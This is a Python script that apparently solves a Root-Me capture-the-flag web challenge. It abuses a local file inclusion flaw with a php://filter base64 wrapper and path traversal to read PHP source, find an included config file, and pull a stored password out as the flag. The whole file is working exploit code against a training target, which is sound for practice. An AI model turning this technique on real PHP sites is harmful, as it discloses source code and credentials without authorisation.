import base64
import requests

# 1. Get name(config.php)
params = { "inc": "php://filter/convert.base64-encode/resource=../ch12/ch12.php" }

response = requests.get(url="http://challenge01.root-me.org/web-serveur/ch12/", params=params)

encodedBody = response.text
encodedBody = encodedBody[encodedBody.find("</ul>")+6:]
encodedBody = encodedBody[:encodedBody.find("\n  </body>")]
body = str(base64.b64decode(encodedBody))
body = body[body.find("include")+9:]
body = body[:body.find(";")-2]

# 2. Get flag
params = { "inc": "php://filter/convert.base64-encode/resource=../ch12/"+body }

response = requests.get(url="http://challenge01.root-me.org/web-serveur/ch12/", params=params)
encodedBody = response.text
encodedBody = encodedBody[encodedBody.find("</ul>")+6:]
encodedBody = encodedBody[:encodedBody.find("\n  </body>")]
body = str(base64.b64decode(encodedBody))
body = body[body.find("password")+10:]
flag = body[:body.find("\"")]
print(f"{flag = }")
